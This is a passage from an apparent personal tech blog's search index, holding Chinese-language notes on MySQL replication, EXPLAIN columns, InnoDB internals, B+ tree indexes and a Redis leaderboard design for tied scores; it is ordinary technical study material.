        <content type="html"><![CDATA[<ul><li><h4 id="Replication-线程"><a href="#Replication-线程" class="headerlink" title="Replication 线程"></a>Replication 线程</h4></li></ul><ol><li>master与slave之间实现整个复制过程主要由三个线程完成：两个（SQL线程和IO线程）在slave端，一个（IO线程）在master端。</li><li>要实现MySQL的replication，必须打开master端的Binary Log(mysql-bin.xxx)功能。</li><li>整个复制过程实际上就是slave从master端获取日志然后在自己身上<strong>顺序执行</strong>日志中记录的各种操作。</li></ol><ul><li><h4 id="复制基本过程（异步的）"><a href="#复制基本过程（异步的）" class="headerlink" title="复制基本过程（异步的）"></a>复制基本过程（异步的）</h4></li></ul><ol><li>slave上的IO线程连接master，请求从指定日志文件的指定位置（或者从最开始）之后的日志内容。 </li><li>master收到请求，负责复制的IO根据请求信息读取指定的日志，并返回（日志文件的地址也返回，方便下次直接根据地址请求）</li><li>slave的IO收到信息后，将日志内容依次写入到slave端的relay log文件的最末端，存master日志文件的地址。</li><li>slave的SQL线程检测到Relay Log中新加内容后，马上解析该Log文件的内容（Query语句），从而能保证两端的数据是一样的。</li></ol><ul><li><h4 id="MySQL半同步模式"><a href="#MySQL半同步模式" class="headerlink" title="MySQL半同步模式"></a>MySQL半同步模式</h4></li></ul><ol><li>在这种模式下：master会等到binlog<strong>成功传送并写入至少一个slave的relay log之后才会提交</strong>，否则一直等待，直到timeout（默认10s）。当出现timeout的时候，master会自动切换半同步为异步，<strong>直到至少有一个slave成功收到并发送Acknowledge，master会再切换回半同步模式</strong>。结合这个新功能，我们可以做到，在允许损失一定的事务吞吐量的前提下来保证同步数据的绝对安全，因为当你设置timeout为一个足够大的值的情况下，任何提交的数据都会安全抵达slave。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-Explain字段含义</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-Explain%E5%AD%97%E6%AE%B5%E5%90%AB%E4%B9%89/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-Explain%E5%AD%97%E6%AE%B5%E5%90%AB%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-explain用法和结果的含义"><a href="#mysql-explain用法和结果的含义" class="headerlink" title="mysql explain用法和结果的含义"></a><a href="https://www.cnblogs.com/yycc/p/7338894.html">mysql explain用法和结果的含义</a></h1><h3 id="explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。"><a href="#explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。" class="headerlink" title="explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。"></a>explain或desc显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。</h3><blockquote><p>explain 数据表 或 desc 数据表</p><p>显示数据表各字段含义</p></blockquote><blockquote><p>explain sql 或desc sql</p><p>显示sql执行效率</p></blockquote><h3 id="explain列解释"><a href="#explain列解释" class="headerlink" title="explain列解释"></a>explain列解释</h3><ol><li><p>&#x3D;&#x3D;table&#x3D;&#x3D; 输出的行所引用的表</p></li><li><p>&#x3D;&#x3D;select_type&#x3D;&#x3D; select类型</p><blockquote><ul><li><strong>SIMPLE</strong>:简单SELECT(不使用UNION或子查询)</li><li><strong>PRIMARY</strong>:最外面的SELECT</li><li><strong>UNION</strong>:UNION中的第二个或后面的SELECT语句</li><li><strong>DEPENDENT UNION</strong>:UNION中的第二个或后面的SELECT语句,取决于外面的查询</li><li><strong>UNION RESULT</strong>:UNION 的结果</li><li><strong>SUBQUERY</strong>:子查询中的第一个SELECT</li><li><strong>DEPENDENT SUBQUERY</strong>:子查询中的第一个SELECT,取决于外面的查询</li><li><strong>DERIVED</strong>:导出表的SELECT(FROM子句的子查询)</li></ul></blockquote></li><li><p>&#x3D;&#x3D;type&#x3D;&#x3D; 这是重要的列，显示连接使用了何种类型。</p><blockquote><p>结果值从好到坏依次是：</p><p>system &gt; const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery &gt; range &gt; index &gt; ALL</p><ul><li><strong>system</strong>:表仅有一行(&#x3D;系统表)。这是const联接类型的一个特例。</li><li><strong>const</strong>:表最多有一个匹配行,它将在查询开始时被读取。因为仅有一行,在这行的列值可被优化器剩余部分认为是常数。const表很快,因为它们只读取一次!</li><li><strong>eq_ref</strong>:对于每个来自于前面的表的行组合,从该表中读取一行。这可能是最好的联接类型,除了const类型。</li><li><strong>ref</strong>:对于每个来自于前面的表的行组合,所有有匹配索引值的行将从这张表中读取。</li><li><strong>ref_or_null</strong>:该联接类型如同ref,但是添加了MySQL可以专门搜索包含NULL值的行。</li><li><strong>index_merge</strong>:该联接类型表示使用了索引合并优化方法。</li><li><strong>unique_subquery</strong>:该类型替换了下面形式的IN子查询的ref: value IN (SELECT primary_key FROM single_table WHERE some_expr) unique_subquery是一个索引查找函数,可以完全替换子查询,效率更高。</li><li><strong>index_subquery</strong>:该联接类型类似于unique_subquery。可以替换IN子查询,但只适合下列形式的子查询中的非唯一索引: value IN (SELECT key_column FROM single_table WHERE some_expr)</li><li><strong>range</strong>:只检索给定范围的行,使用一个索引来选择行。</li><li><strong>index</strong>:该联接类型与ALL相同,除了只有索引树被扫描。这通常比ALL快,因为索引文件通常比数据文件小。</li><li><strong>ALL</strong>:对于每个来自于先前的表的行组合,进行完整的表扫描。</li></ul></blockquote></li><li><p>&#x3D;&#x3D;possible_keys&#x3D;&#x3D; 指出MySQL能使用哪个索引在该表中找到行。</p></li><li><p>&#x3D;&#x3D;key&#x3D;&#x3D; 实际使用的索引。如果为NULL，则没有使用索引。很少的情况下，MYSQL会选择优化不足的索引。</p><blockquote><p>可以在SELECT语句中使用USE INDEX（indexname）、force index(indexname) 来强制使用一个索引或者用IGNORE INDEX（indexname）来强制MYSQL忽略索引</p></blockquote></li><li><p>&#x3D;&#x3D;key_len&#x3D;&#x3D; 使用的索引的长度。在不损失精确性的情况下，长度越短越好。如果键是NULL,则长度为NULL。</p></li><li><p>&#x3D;&#x3D;ref&#x3D;&#x3D; 显示使用哪个列或常数与key一起从表中选择行。</p></li><li><p>&#x3D;&#x3D;rows&#x3D;&#x3D; MYSQL认为必须检查的用来返回请求数据的行数。</p></li><li><p>&#x3D;&#x3D;extra&#x3D;&#x3D; 关于MYSQL如何解析查询的额外信息。</p><blockquote><p>坏的例子是<strong>Using temporary</strong>和<strong>Using filesort</strong>，意思MYSQL根本不能使用索引，结果是检索会很慢。</p><ul><li>distinct: 一旦MYSQL找到了与行相联合匹配的行，就不再搜索了。</li><li>not exists: MYSQL优化了LEFT JOIN，一旦它找到了匹配LEFT JOIN标准的行，就不再搜索了。</li><li>range checked for each Record（index map:#）:MySQL没有发现好的可以使用的索引,但发现如果来自前面的表的列值已知,可能部分索引可以使用。这是使用索引的最慢的连接之一。</li><li><strong>using filesort</strong>: 看到这个的时候，查询就需要优化了。<strong>MYSQL需要进行额外的步骤来发现如何对返回的行排序</strong>。它根据连接类型以及存储排序键值和匹配条件的全部行的行指针来排序全部行。</li><li>using index: 从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。</li><li>using temporary 看到这个的时候，查询需要优化了。为了解决查询,MySQL需要创建一个临时表来容纳结果。这通常发生在对不同的列集进行ORDER BY上，而不是GROUP BY上。</li><li>where used 使用了WHERE从句来限制哪些行将与下一张表匹配或者是返回给用户。如果不想返回表中的全部行，并且连接类型ALL或index，这就会发生，或者是查询有问题不同连接类型的解释（按照效率高低的顺序排序）</li><li>system 表只有一行：system表。这是const连接类型的特殊情况。</li><li>const 表中的一个记录的最大值能够匹配这个查询（索引可以是主键或惟一索引）。因为只有一行，这个值实际就是常数，因为MYSQL先读这个值然后把它当做常数来对待。</li><li>eq_ref 在连接中，MYSQL在查询时，从前面的表中，对每一个记录的联合都从表中读取一个记录，它在查询使用了索引为主键或惟一键的全部时使用。</li><li>ref 这个连接类型只有在查询使用了不是惟一或主键的键或者是这些类型的部分（比如，利用最左边前缀）时发生。对于之前的表的每一个行联合，全部记录都将从表中读出。这个类型严重依赖于根据索引匹配的记录多少—越少越好。</li><li>range 这个连接类型使用索引返回一个范围中的行，比如使用&gt;或&lt;查找东西时发生的情况。</li><li>index 这个连接类型对前面的表中的每一个记录联合进行完全扫描（比ALL更好，因为索引一般小于表数据）。</li><li>ALL 这个连接类型对于前面的每一个记录联合进行完全扫描，这一般比较糟糕，应该尽量避免。</li></ul></blockquote></li><li><p>&#x3D;&#x3D;filtered&#x3D;&#x3D; 显示了通过条件过滤出的行数的百分比估计值。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-InnoDB存储引擎</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<h3 id="InnoDB引擎的4大特性"><a href="#InnoDB引擎的4大特性" class="headerlink" title="InnoDB引擎的4大特性"></a>InnoDB引擎的4大特性</h3><ol><li><p>插入缓存（物理页的一个组成部分）</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show engine innodb status\G;INSERT BUFFER AND ADAPTIVE HASH INDEX # 插入缓冲信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对于非聚集索引的插入或更新操作，不是每次直接插入索引页。而是先判断插入的非聚集索引页是否在缓冲池中。如果在，则直接插入，如果不在，先放入插入缓冲区，然后再以一定的频率执行插入缓冲和非聚集索引页子节点的合并操作。</p><blockquote><p>那什么时候进行合并呢？</p><ul><li>非聚集索引页被读取到缓冲池中。select先检查insert buffer是否有非聚集索引页的存在，如果有则合并。</li><li>非聚集索引页没有可用空间。空间小于1&#x2F;32页的大小，则进行合并。</li><li>master thread每秒和每10秒的合并操作。</li></ul></blockquote><p>这样通常能将多个插入合并到一个操作中，目的还是为了减少随机IO带来性能损耗。</p><p>使用需要满足两个条件</p><ul><li>索引是非聚集索引</li><li>索引不是唯一索引的</li></ul></li><li><p>两次写 double write</p><p>二次写缓存位于系统表空间，用来缓存从buffer poll中flush之后，写入数据文件之前的数据。数据页到double write以一次大的连续块的方式写入，需要的IO消耗小于写入数据文件的消耗。</p><blockquote><p>double write的组成：</p><ul><li><p>内存中double write buffer，大小为2M。</p></li><li><p>物理磁盘上共享表空间中连续的128个页，即两个区，大小为2M。</p></li></ul></blockquote><p>对缓冲池中的脏页进行刷新时，不是直接写磁盘，而是将脏页先复制到内存中的double write buffer，之后通过double write分两次，每次1M顺序的写入共享表空间的物理磁盘上。因为double write页是连续的，顺序写的开销很小。在完成double write页的写入后，再将double write buffer 中的页写入各个表空间文件中。这时的写入是离散的，如果在写入过程中出现崩溃，可以使用共享表空间的double write页进行恢复。</p></li><li><p>自适应哈希索引</p><p>InnoDB会监控对表上索引的查找，如果建立哈希索引可以带来速度的提升，则建立哈希索引。自适应哈希索引通过缓冲池的B+树构造，因此建立速度很快。</p><p>哈希索引会根据访问的频率和模式为&#x3D;&#x3D;某些页建&#x3D;&#x3D;立哈希索引，而不是整个表。</p><p>自适应哈希索引占用InnoDB buffer poll的空间。</p></li><li><p>预读</p><ul><li><p>随机预读（已废弃）</p><p>当一个区中&#x3D;&#x3D;13&#x3D;&#x3D;个页在缓冲区中，并在LRU列表的前端，则InnoDB存储引擎会将这个区中剩余的所有页都预读到缓冲区。InnoDB Plugin 1.0.4开始，随机预读被取消。</p></li><li><p>线性预读</p><p>基于缓冲池中页的访问模式，而不是数量。如果一个区中的N个页都被顺序的访问了，则InnoDB会读取下一个区的所有页。N的值由<code>innodb_read_ahead_threshold</code>控制，默认值56。</p></li></ul></li></ol><h3 id="InnoDB体系架构"><a href="#InnoDB体系架构" class="headerlink" title="InnoDB体系架构"></a>InnoDB体系架构</h3><p><img src="https://img-blog.csdnimg.cn/20200504133348713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="后台线程"><a href="#后台线程" class="headerlink" title="后台线程"></a>后台线程</h4><p>默认情况下InnoDB后台有7个线程（版本不同，线程数可能不同；线程数也可以配置）</p><ol><li><p>1个master thread（几乎实现了所有功能）</p></li><li><p>1个锁监控线程</p></li><li><p>1个错误监控线程</p></li><li><p>4个I&#x2F;O thread（不同版本read write线程数可能不同）</p><blockquote><p>Insert  buffer thread</p><p>Log thread</p><p>Read thread</p><p>Write  thread</p></blockquote><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show engine innodb status\G; # 过去某个时间段的数据库状态Per second averages calculated from the last 46 seconds # 过去46s内的状态FILE I&#x2F;Oxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><ol><li><p>缓冲池 buffer poll<br>占最大块内存，InnoDB将数据库文件按页（16k）读到缓冲池，然后按LRU保留缓存数据。数据库文件需要修改，首先修改缓冲池中的页（发生修改后，该页为脏页），按照一定的频率将缓冲池中的脏页刷新到文件。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show engine innodb status;BUFFER POOL AND MEMORYBuffer pool size   8191 # 一共多少个缓冲帧Free buffers       7529 # 空闲缓冲帧Database pages     658 # 已经使用缓冲帧Old database pages 262Modified db pages  0 # 脏页数量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>缓冲池中的数据页类型<ol><li>索引页</li><li>数据页</li><li>undo页</li><li>插入缓冲 insert buffer</li><li>自适应hash索引</li><li>InnoDB锁信息 lock info</li><li>数据字典信息 data dictionary</li></ol></li></ul></li><li><p>重做日志缓冲池 redo log buffer</p></li><li><p>额外内存池 additional memory poll</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-SortedSet排行榜同分</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-SortedSet%E6%8E%92%E8%A1%8C%E6%A6%9C%E5%90%8C%E5%88%86/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-SortedSet%E6%8E%92%E8%A1%8C%E6%A6%9C%E5%90%8C%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h4 id="排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况："><a href="#排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况：" class="headerlink" title="排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况："></a>排行榜可以使用SortedSet，但是如果同分的时候会有两种相对难搞的情况：</h4><ol><li>谁排名靠前，按需求展示。</li><li>同分名次并列。</li></ol><h4 id="同分不同名"><a href="#同分不同名" class="headerlink" title="同分不同名"></a>同分不同名</h4><p>SortedSet score支持浮点数，只要给每个score加上对应的小数，就能实现按先后达到目标值的排序进行展示。</p><blockquote><p>如 1&#x2F;timestamp 或 1&#x2F;(时间戳最大值-timestamp)，这里可能有精度问题注意一下。</p></blockquote><h4 id="同分同名次"><a href="#同分同名次" class="headerlink" title="同分同名次"></a>同分同名次</h4><p>这时一个SortedSet 就不能满足需求了，因为不知道前面有多少个同分的成员。</p><ul><li><p>两个SortedSet，一个Hash<br>A SortedSet 放所有排名信息 member score<br>B SortedSet 放不重复的分数排名 member和score都用A中的score<br>C Hash记录 score 及 该分数成员的数量</p></li><li><p>数据更新<br>分数增加或减少<br>1.检查C key中原分数下成员的数量，并减1，如果数量为0，删除在 B key中对应分数；检查新的分数是否已经在B key中，如果没有，加进去。<br>2.C key新的分数下团的数量加1。<br>3.A key正常增加分数。</p></li><li><p>存在的问题：<br>两次分页请求可能存在排名变化，导致获取的数据重复的丢失的情况。</p></li><li><p>解决方案：<br>如果不能接受两次请求间排名变化导致的数据误差，可以给榜单做快照，请求时将快照编号带给服务端来解决。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql面试100问</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%9D%A2%E8%AF%95100%E9%97%AE/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%9D%A2%E8%AF%95100%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h5 id="面试官：“了解MySQL吗？”"><a href="#面试官：“了解MySQL吗？”" class="headerlink" title="面试官：“了解MySQL吗？”"></a>面试官：“了解MySQL吗？”</h5><p>要是说不了解，接下来该聊些啥呀？</p><h5 id="面试官：“了解的话，那说说XXX吧。”"><a href="#面试官：“了解的话，那说说XXX吧。”" class="headerlink" title="面试官：“了解的话，那说说XXX吧。”"></a>面试官：“了解的话，那说说XXX吧。”</h5><p>巴拉巴拉…</p><h3 id="MySQL有哪些常见的引擎，说说他们的区别？"><a href="#MySQL有哪些常见的引擎，说说他们的区别？" class="headerlink" title="MySQL有哪些常见的引擎，说说他们的区别？"></a>MySQL有哪些常见的引擎，说说他们的区别？</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show engines; #查看支持的引擎<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>MyISAM：非事务处理存储引擎</p><p>索引放在XX.MYI文件中，数据放在XX.MYD文件中。</p></li><li><p>InnoDB：具备外键功能的存储引擎</p><p>索引也是数据。数据和索引存在一个XX.IDB文件中。</p></li><li><p>Mermory：基于内存</p><p>Memory表至少比MyISAM表要快一个数量级，因为所有的数据都保存在内存中，不需要进行磁盘I&#x2F;O。Memory表的结构在重启以后还会保留，但数据会丢失。</p></li><li><p>Archive：数据存档，数据插入后不能修改</p><p>针对高写入压缩做了优化的简单引擎。</p><table><thead><tr><th>特点</th><th>InnoDB</th><th>MyISAM</th><th>Memory</th><th>Archive</th></tr></thead><tbody><tr><td>b+树索引</td><td>yes</td><td>yes</td><td>yes</td><td>no</td></tr><tr><td>MVCC</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>事务</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>存储限制</td><td>64TB</td><td>256TB</td><td>RAM</td><td>None</td></tr><tr><td>索引缓存</td><td>yes</td><td>yes</td><td>本身就是缓存</td><td>No</td></tr><tr><td>外键</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>锁粒度</td><td>row</td><td>table</td><td>table</td><td>row</td></tr><tr><td>全文索引</td><td>yes</td><td>yes</td><td>no</td><td>no</td></tr><tr><td>数据缓存</td><td>yes</td><td>no</td><td>本身就是缓存</td><td>no</td></tr></tbody></table></li></ul><h3 id="有哪些索引和他们之间的区别？"><a href="#有哪些索引和他们之间的区别？" class="headerlink" title="有哪些索引和他们之间的区别？"></a>有哪些索引和他们之间的区别？</h3><ul><li><h5 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h5><p>优点：</p><ol><li>Hash索引的检索可以一次到位，所以Hash索引的查询效率更高。</li></ol><p>缺点：</p><ol><li>Hash索引只能满足”&#x3D;”，”IN”，”!&#x3D;”，不能使用范围查询。</li><li>Hash值的大小关系不一定个原键值一样，不能做排序操作。</li><li>联合索引中不能利用部分索引键查询。</li><li>遇到大量Hash值相等的情况后，性能不一定比B树高。</li><li>存储引擎会为Hash索引中的每一列都计算hash码，Hash索引中存储的即hash码，所以每次读取都会进行两次查询。</li></ol><p>InnoDB引擎有一个特殊功能叫“自适应哈希索引”。当InnoDB发现某些索引值被使用的非常频繁是，会在内存中基于B-Tree索引之上再建一个哈希索引，这样可以让B-Tree索引具有哈希索引的优点。这是一个&#x3D;&#x3D;完全自动的、内部的行为&#x3D;&#x3D;，用户无法控制或配置（如果有必要，可以关闭该功能）。</p></li><li><h5 id="B-树索引"><a href="#B-树索引" class="headerlink" title="B+树索引"></a>B+树索引</h5><p>优点：</p><ol><li><p>所有索引数据都在叶子结点上，并且增加了顺序访问指针,每个叶子节点都有指向相邻叶子节点的指针。</p></li><li><p>利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I&#x2F;O就可以完全载入。</p></li><li><p><strong>B-Tree中一次检索最多需要h-1次I&#x2F;O（根节点常驻内存），渐进复杂度为O(h)&#x3D;O(logdN)。</strong></p><p>假设叶子节点页可以存放100条记录，内部节点可以存放1000条目录，则</p><p>h&#x3D;1，最多能放100条记录。</p><p>h&#x3D;2，最多能放1000*100&#x3D;100000条记录。</p><p>h&#x3D;3，最多能放1000*1000*100&#x3D;100000000（一亿）条记录。</p><p>h&#x3D;4，最多能放1000*1000*1000*100&#x3D;100000000000（一千亿）条记录，应该不会有这种数据量的表吧！</p><p>那为什么是O(logdN)呢？因为在页内查找一条记录时，使用的是&#x3D;&#x3D;二分查找&#x3D;&#x3D;。</p></li></ol></li><li><h5 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h5><ol><li>5.6版本之后InnoDB存储引擎开始支持全文索引，5.7版本之后通过使用ngram插件开始支持中文。</li><li>底层实现为倒排索引。</li></ol></li></ul><hr><ul><li><h5 id="聚集索引（聚簇索引）"><a href="#聚集索引（聚簇索引）" class="headerlink" title="聚集索引（聚簇索引）"></a>聚集索引（聚簇索引）</h5><ol><li><p>表数据按照索引的顺序存储，也就是说索引项的顺序和表中记录的物理顺序一致。</p></li><li><p>聚簇索引叶子节点存储了真实的数据行，不在有单独的数据页。</p></li><li><p>一张表只能创建一个聚簇索引，因为物理存储顺序只能有一种。<strong>聚簇集</strong>指的是数据行和相关的键值都保存在一起。</p></li><li><p>如果主键不是自增ID，MySQL会不断的调整数据的物理地址、分页分裂、页合并。如果自增，只需要一页一页的写，索引结构相对紧凑，磁盘碎片少，效率高。</p></li><li><p>聚簇索引不是人为创建的，默认就有。</p><p><img src="https://img-blog.csdnimg.cn/20200419175724907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol></li><li><h4 id="非聚集索引（二级索引）"><a href="#非聚集索引（二级索引）" class="headerlink" title="非聚集索引（二级索引）"></a>非聚集索引（二级索引）</h4><ol><li><p>表数据存储顺序与索引顺序无关。叶子节点包含索引字段值及指向数据页数据行的逻辑指针（行的主键值）。</p></li><li><p>适当建立联合索引（索引列包含全部查找列）能达到不用回表即可获取数据的目的。</p></li><li><p>为了保证B+树的同一层内节点的目录项记录除页号字段外是唯一的，内节点需要增加主键字段，即二级索引内节点由三部分组成：</p><blockquote><p>索引列的值</p><p>主键值</p><p>页号（页指针）</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020041917570460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><hr></li><li><p>主键索引</p><ol><li>每张表都会有主键，也会用主键生成主键索引。</li><li>主键索引就是聚簇索引，因此建表时最好用自增类型主键。</li><li>如果没有设置主键会发生什么？建表时如果没有设置主键，MySQL会启用内部的隐藏主键&#x3D;&#x3D;row_id&#x3D;&#x3D;（6个字节），也就是说无论如何一张表都必须有主键。MySQL会依次查找<strong>主键-&gt;唯一键-&gt;隐藏主键</strong>建立索引。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">alter table table_name add primary key (column name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>普通索引，联合索引</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create index 索引名 on table_name(column1,column2);alter table table_name add index 索引名(column1,column2);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>唯一索引</p><ol><li>唯一索引可以有多个null（不提倡有null值）,但不能有重复的内容。</li><li>相比主键索引，主键字段不能为null，也不能重复。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create unique index index_name on table_name (column_list);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="为什么要使用索引？"><a href="#为什么要使用索引？" class="headerlink" title="为什么要使用索引？"></a>为什么要使用索引？</h3><ol><li>减少存储引擎需要扫描的数据量，加快查询速度。</li><li>索引可以把随机I&#x2F;O变为顺序I&#x2F;O。</li><li>对索引结果进行排序以避免使用磁盘临时表。</li></ol><h3 id="建索引、使用索引要注意什么？"><a href="#建索引、使用索引要注意什么？" class="headerlink" title="建索引、使用索引要注意什么？"></a>建索引、使用索引要注意什么？</h3><ol><li>数据类型越小越好。数据类型越小，在磁盘、内存和CPU缓存中需要的空间更少，处理速度更快。</li><li>数据类型越简单越好。整形优于字符串，内置日期和时间优于字符串。</li><li>尽量避免NULL。</li><li>复合索引将最常用作限制条件的列放在最左边，依次递减。</li><li>复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。</li><li>短索引。对串列进行索引，如果可能应该指定一个前缀长度，不仅可以提高查询速度而且可以节省磁盘空间和I&#x2F;O操作。</li><li>mysql查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。</li><li>建立索引的时候，可以加上nologging选项。以减少在建立索引过程中产生的大量redo，从而提高执行的速度。</li><li>建立索引的时候要对表进行加锁，因此应当注意操作在业务空闲的时候进行。</li><li>使用NOT IN和!&#x3D;操作，mysql将无法使用索引。</li><li>不要在列上进行运算，where字句的查询条件里使用了函数将不会使用索引。</li></ol><h3 id="B-树有什么特点？为什么B-树更适合做索引？"><a href="#B-树有什么特点？为什么B-树更适合做索引？" class="headerlink" title="B+树有什么特点？为什么B+树更适合做索引？"></a>B+树有什么特点？为什么B+树更适合做索引？</h3><p>回答这个问题，心里一定要有点B树🐶。</p><ol><li><p>二叉查找树：</p><ul><li><p>左子树不为空，则左子树节点值均小于根节点。</p></li><li><p>右子树不为空，则右子树节点值均大于根节点。</p></li><li><p>任意节点的左右子树也是二叉查找树。</p></li><li><p>没有键值相同的节点。</p></li><li><p>有可能会退化成一条线性链。</p></li></ul></li><li><p>AVL树：</p><ul><li><p>AVL树是带有平衡条件的二叉查找树，一般用平衡因子差值判断是否平衡并通过旋转实现平衡。</p></li><li><p>左右子树高度差不超过1。</p></li><li><p>与红黑树相比，它是严格的平衡二叉树。</p></li><li><p>AVL树适合于插入删除比较少，但查找多的情况。</p></li></ul></li><li><p>红黑树：</p><ul><li>一种二叉查找树，每个节点增加一个存储位标识颜色。</li><li>通过对任何一条从根节点到叶子节点的路径上各个节点着色方式的限制，确保没有一条路径会比其他路径长出两倍。</li><li>是一种弱平衡二叉树，相对AVL树，它的旋转次数少，适用于搜索，插入，删除操作多的情况。</li></ul></li><li><p>B树（b-树）</p><ul><li>为了磁盘或其它存储设备而设计的一种平衡多路查找树。</li><li>与二叉树相比，每个节点有多个分支。在相同节点的情况下，高度远远低于红黑树。</li><li>B&#x2F;B+树操作时间由磁盘存取和CPU两部分构成，CPU速度非常快，多以B树的效率取决于磁盘访问次数。关键字总数相同的情况下B树的高度越小，磁盘I&#x2F;O所花时间越少。</li><li>所有叶子节点位于同一层。</li></ul></li><li><p>B+树</p><ul><li>B树的变形树，非叶子节点只保存索引，不保存实际的数据，数据都保存在叶子节点中，且有序。</li><li>B树不允许关键字重复,B+树允许重复。</li><li>所有叶子节点都有指向下一个叶子节点的指针。</li></ul></li><li><h5 id="那么为什么是B-树？"><a href="#那么为什么是B-树？" class="headerlink" title="那么为什么是B+树？"></a>那么为什么是B+树？</h5><ul><li><p>磁盘读写代价更低：内部节点只有指向下层节点的页指针（6个字节），因此内部节点相对B树更小，一页空间能容纳的关键字数量更多，I&#x2F;O次数也就更少。</p></li><li><p>查询效率更稳定：任何关键字的查找必须走一条从根结点到叶子结点的路，所以每一个数据的查询效率相当。</p></li><li><p>利于数据库的扫描：B+树只需要遍历叶子节点就可以实现对全部关键字的扫描，更有利于范围查询。B树如果需要扫描，需要进行一次中序遍历，效率太低。</p></li></ul></li><li><h5 id="InnoDB的B-树索引"><a href="#InnoDB的B-树索引" class="headerlink" 